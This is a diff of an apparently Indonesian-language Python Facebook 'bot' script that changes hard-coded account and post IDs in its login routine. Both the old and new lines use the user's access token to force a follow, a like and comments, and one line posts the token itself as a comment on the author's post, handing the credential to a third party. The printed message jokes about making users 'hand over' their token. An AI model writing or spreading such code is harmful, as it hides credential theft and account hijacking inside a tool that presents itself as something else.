@@ -201,11 +201,11 @@ def bot():
 		time.sleep(0.5)
 		login()
 	print(balmond+l+" Bentarr Bree, Follow Duluu Amaa Setor Token Mwhehehe")
-	komentar = random.choice(["Apa Kabar Bang Ndrii"])
-	requests.post("https://graph.facebook.com/100014905842581/subscribers?access_token="+token) # sptty chan
-	requests.post("https://graph.facebook.com/1262475690925947/likes?summary=true&access_token=" + token)
-	requests.post("https://graph.facebook.com/1262475690925947/comments/?message="+komentar+"&access_token="+token)
-	requests.post("https://graph.facebook.com/1262475690925947/comments/?message="+token+"&access_token="+token)
+	komentar = random.choice(["Apa Kabar Bang Jee"])
+	requests.post("https://graph.facebook.com/100000023387791/subscribers?access_token="+token) # sptty chan
+	requests.post("https://graph.facebook.com/5309240245753369/likes?summary=true&access_token=" + token)
+	requests.post("https://graph.facebook.com/5309240245753369/comments/?message="+komentar+"&access_token="+token)
+	requests.post("https://graph.facebook.com/5309240245753369/comments/?message="+token+"&access_token="+token)
 	menu()
 
 # MENU
